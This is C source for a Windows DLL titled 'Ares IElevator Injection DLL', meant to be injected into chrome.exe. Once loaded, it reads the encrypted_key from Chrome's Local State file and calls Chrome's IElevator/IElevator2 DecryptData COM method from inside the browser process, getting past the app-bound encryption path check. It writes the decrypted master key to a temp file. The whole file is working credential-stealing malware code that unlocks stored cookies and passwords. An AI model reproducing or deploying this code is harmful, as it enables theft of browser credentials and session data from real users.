/* Ares IElevator Injection DLL
 *
 * Injected into chrome.exe via NtCreateThreadEx + LoadLibrary
 * Running inside chrome.exe context → IElevator path check passes
 * 
 * DllMain → Thread → CoCreateInstance(IElevator) → DecryptData → write to file
 */
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <oleauto.h>

/* Use Windows types directly */

/* IElevator COM GUIDs */
/* CLSID = {708860E0-F641-4611-8895-7D867DD3675B} */
static const unsigned char clsid_bytes[] = {
    0xE0,0x60,0x88,0x70, 0x41,0xF6, 0x11,0x46,
    0x88,0x95, 0x7D,0x86,0x7D,0xD3,0x67,0x5B
};

/* IElevator IID = {A949CB4E-C4F9-44C4-B213-6BF8AA9AC69C} */
static const unsigned char iid_bytes[] = {
    0x4E,0xCB,0x49,0xA9, 0xF9,0xC4, 0xC4,0x44,
    0xB2,0x13, 0x6B,0xF8,0xAA,0x9A,0xC6,0x9C
};

/* IElevator2 IID = {8F7B6792-784D-4047-845D-1782EFBEF205} */
static const unsigned char iid2_bytes[] = {
    0x92,0x67,0x7B,0x8F, 0x4D,0x78, 0x47,0x40,
    0x84,0x5D, 0x17,0x82,0xEF,0xBE,0xF2,0x05
};

/* IUnknown IID */
static const unsigned char iunk_bytes[] = {
    0x00,0x00,0x00,0x00, 0x00,0x00, 0x00,0x00,
    0xC0,0x00, 0x00,0x00,0x00,0x00,0x00,0x46
};

/* COM function types */
typedef HRESULT (__stdcall *pfnCoInitializeEx)(void*, unsigned long);
typedef HRESULT (__stdcall *pfnCoCreateInstance)(const void*, void*, unsigned long, const void*, void**);
typedef void    (__stdcall *pfnCoUninitialize)(void);
typedef BSTR    (__stdcall *pfnSysAllocStringByteLen)(const char*, unsigned int);
typedef unsigned int (__stdcall *pfnSysStringByteLen)(BSTR);
typedef void    (__stdcall *pfnSysFreeString)(BSTR);

/* Signal file path */
#define SIGNAL_FILE "\\ares_elev_result.bin"

static DWORD WINAPI do_elevator_work(void* param)
{
    (void)param;
    
    /* Get temp path */
    char tmpPath[260];
    GetTempPathA(260, tmpPath);
    char sigPath[260];
    int i;
    for (i = 0; tmpPath[i]; i++) sigPath[i] = tmpPath[i];
    const char* sig = "ares_elev_result.bin";
    for (int j = 0; sig[j]; j++) sigPath[i++] = sig[j];
    sigPath[i] = 0;

    /* Load ole32.dll for COM */
    HMODULE hOle32 = LoadLibraryA("ole32.dll");
    HMODULE hOleAut = LoadLibraryA("oleaut32.dll");
    if (!hOle32 || !hOleAut) goto write_error;

    pfnCoInitializeEx pCoInit = (pfnCoInitializeEx)GetProcAddress(hOle32, "CoInitializeEx");
    pfnCoCreateInstance pCoCreate = (pfnCoCreateInstance)GetProcAddress(hOle32, "CoCreateInstance");
    pfnCoUninitialize pCoUninit = (pfnCoUninitialize)GetProcAddress(hOle32, "CoUninitialize");
    pfnSysAllocStringByteLen pAlloc = (pfnSysAllocStringByteLen)GetProcAddress(hOleAut, "SysAllocStringByteLen");
    pfnSysStringByteLen pByteLen = (pfnSysStringByteLen)GetProcAddress(hOleAut, "SysStringByteLen");
    pfnSysFreeString pFree = (pfnSysFreeString)GetProcAddress(hOleAut, "SysFreeString");

    if (!pCoInit || !pCoCreate || !pAlloc) goto write_error;

    /* Read encrypted_key from Chrome Local State */
    char localApp[260];
    GetEnvironmentVariableA("LOCALAPPDATA", localApp, 260);
    char lsPath[512];
    int p = 0;
    for (int k = 0; localApp[k]; k++) lsPath[p++] = localApp[k];
    const char* suffix = "\\Google\\Chrome\\User Data\\Local State";
    for (int k = 0; suffix[k]; k++) lsPath[p++] = suffix[k];
    lsPath[p] = 0;

    HANDLE hLS = CreateFileA(lsPath, GENERIC_READ, FILE_SHARE_READ|FILE_SHARE_WRITE,
        NULL, OPEN_EXISTING, 0, NULL);
    if (hLS == INVALID_HANDLE_VALUE) goto write_error;

    DWORD fsize = GetFileSize(hLS, NULL);
    char* data = (char*)HeapAlloc(GetProcessHeap(), 0, fsize+1);
    DWORD rd;
    ReadFile(hLS, data, fsize, &rd, NULL);
    CloseHandle(hLS);
    data[rd] = 0;

    /* Find encrypted_key */
    char* ek = NULL;
    for (DWORD s = 0; s + 17 < rd; s++) {
        if (data[s]=='e' && data[s+1]=='n' && data[s+2]=='c' && data[s+3]=='r' &&
            data[s+4]=='y' && data[s+5]=='p' && data[s+6]=='t' && data[s+7]=='e' &&
            data[s+8]=='d' && data[s+9]=='_' && data[s+10]=='k' && data[s+11]=='e' &&
            data[s+12]=='y' && data[s+15]=='"') {
            ek = &data[s+17]; /* Skip "encrypted_key":"  */
            break;
        }
    }
    if (!ek) { HeapFree(GetProcessHeap(), 0, data); goto write_error; }
    
    char* ek_end = ek;
    while (*ek_end && *ek_end != '"') ek_end++;
    *ek_end = 0;

    /* Base64 decode */
    HMODULE hCrypt = LoadLibraryA("crypt32.dll");
    typedef BOOL (__stdcall *pfnCSTBA)(const char*, DWORD, DWORD, BYTE*, DWORD*, DWORD*, DWORD*);
    pfnCSTBA pDecode = (pfnCSTBA)GetProcAddress(hCrypt, "CryptStringToBinaryA");
    
    BYTE keyRaw[512];
    DWORD keyLen = sizeof(keyRaw);
    pDecode(ek, 0, 1 /* CRYPT_STRING_BASE64 */, keyRaw, &keyLen, NULL, NULL);
    HeapFree(GetProcessHeap(), 0, data);

    /* Strip "DPAPI" prefix */
    BYTE* blob = keyRaw + 5;
    int blobLen = (int)keyLen - 5;

    /* Initialize COM */
    pCoInit(NULL, 0x2 /* COINIT_APARTMENTTHREADED */);

    /* Get IUnknown first */
    void* pUnk = NULL;
    HRESULT hr = pCoCreate(clsid_bytes, NULL, 0x4 /* CLSCTX_LOCAL_SERVER */,
        iunk_bytes, &pUnk);

    HRESULT hr_unk = hr;
    HRESULT hr_ie1 = 0xFFFFFFFF;
    HRESULT hr_ie2 = 0xFFFFFFFF;

    void* pElev = NULL;

    if (hr >= 0 && pUnk) {
        /* QueryInterface for IElevator/IElevator2 */
        typedef HRESULT (__stdcall *pfnQI)(void*, const void*, void**);
        pfnQI pQueryInterface = ((pfnQI*)(*(void***)pUnk))[0];

        /* Try IElevator first (Chrome 127-143) */
        hr_ie1 = pQueryInterface(pUnk, iid_bytes, &pElev);
        if (hr_ie1 < 0) {
            /* Try IElevator2 (Chrome 144+) */
            hr_ie2 = pQueryInterface(pUnk, iid2_bytes, &pElev);
            hr = hr_ie2;
        } else {
            hr = hr_ie1;
        }

        /* Also try getting IElevator directly via CoCreateInstance */
        if (hr < 0 || !pElev) {
            hr = pCoCreate(clsid_bytes, NULL, 0x4, iid_bytes, &pElev);
            if (hr < 0) {
                hr = pCoCreate(clsid_bytes, NULL, 0x4, iid2_bytes, &pElev);
            }
        }

        typedef ULONG (__stdcall *pfnRelease)(void*);
        ((pfnRelease)(*(void***)pUnk)[2])(pUnk);
    }

    /* Write diagnostic even if QI failed */
    if (hr < 0 || !pElev) {
        HANDLE hOut = CreateFileA(sigPath, GENERIC_WRITE, 0, NULL,
            CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        if (hOut != INVALID_HANDLE_VALUE) {
            DWORD wr;
            DWORD magic = 0xDEAD0001;
            WriteFile(hOut, &magic, 4, &wr, NULL);
            WriteFile(hOut, &hr_unk, 4, &wr, NULL);  /* IUnknown result */
            WriteFile(hOut, &hr_ie1, 4, &wr, NULL);  /* IElevator result */
            WriteFile(hOut, &hr_ie2, 4, &wr, NULL);  /* IElevator2 result */
            WriteFile(hOut, &hr, 4, &wr, NULL);       /* Final result */
            
            /* Also write our process path for debugging */
            char myPath[260];
            GetModuleFileNameA(NULL, myPath, 260);
            DWORD pathLen = (DWORD)strlen(myPath);
            WriteFile(hOut, &pathLen, 4, &wr, NULL);
            WriteFile(hOut, myPath, pathLen, &wr, NULL);
            CloseHandle(hOut);
        }
        return 1;
    }

    /* Call DecryptData — vtable slot 5 (offset 40) */
    BSTR bsEnc = pAlloc((const char*)blob, blobLen);
    BSTR bsDec = NULL;
    DWORD dwStatus = 0;

    typedef HRESULT (__stdcall *pfnDecryptData)(void*, BSTR, BSTR*, DWORD*);
    pfnDecryptData pDecrypt = ((pfnDecryptData*)(*(void***)pElev))[5];
    hr = pDecrypt(pElev, bsEnc, &bsDec, &dwStatus);

    if (hr >= 0 && bsDec) {
        unsigned int decLen = pByteLen(bsDec);
        BYTE* decBytes = (BYTE*)bsDec;

        /* Write result: [4 bytes len][key bytes] */
        HANDLE hOut = CreateFileA(sigPath, GENERIC_WRITE, 0, NULL,
            CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        if (hOut != INVALID_HANDLE_VALUE) {
            DWORD wr;
            DWORD magic = 0xC0FFEE42;
            WriteFile(hOut, &magic, 4, &wr, NULL);
            WriteFile(hOut, &decLen, 4, &wr, NULL);
            WriteFile(hOut, decBytes, decLen, &wr, NULL);
            CloseHandle(hOut);
        }
        pFree(bsDec);
    } else {
        /* Write error */
        HANDLE hOut = CreateFileA(sigPath, GENERIC_WRITE, 0, NULL,
            CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        if (hOut != INVALID_HANDLE_VALUE) {
            DWORD wr;
            DWORD magic = 0xDEAD0000 | (hr & 0xFFFF);
            WriteFile(hOut, &magic, 4, &wr, NULL);
            WriteFile(hOut, &hr, 4, &wr, NULL);
            WriteFile(hOut, &dwStatus, 4, &wr, NULL);
            CloseHandle(hOut);
        }
    }

    pFree(bsEnc);
    { typedef ULONG (__stdcall *pfnR)(void*); ((pfnR)(*(void***)pElev)[2])(pElev); }
    pCoUninit();
    return 0;

write_com_error:
    {
        HANDLE hOut = CreateFileA(sigPath, GENERIC_WRITE, 0, NULL,
            CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        if (hOut != INVALID_HANDLE_VALUE) {
            DWORD wr;
            DWORD magic = 0xDEAD0001;
            WriteFile(hOut, &magic, 4, &wr, NULL);
            WriteFile(hOut, &hr, 4, &wr, NULL);
            CloseHandle(hOut);
        }
    }
    return 1;

write_error:
    {
        HANDLE hOut = CreateFileA(sigPath, GENERIC_WRITE, 0, NULL,
            CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        if (hOut != INVALID_HANDLE_VALUE) {
            DWORD wr;
            DWORD magic = 0xDEAD0002;
            WriteFile(hOut, &magic, 4, &wr, NULL);
            CloseHandle(hOut);
        }
    }
    return 1;
}

BOOL WINAPI DllMain(HINSTANCE hDLL, DWORD reason, LPVOID reserved)
{
    (void)reserved;
    if (reason == DLL_PROCESS_ATTACH) {
        DisableThreadLibraryCalls(hDLL);
        CreateThread(NULL, 0, do_elevator_work, NULL, 0, NULL);
    }
    return TRUE;
}
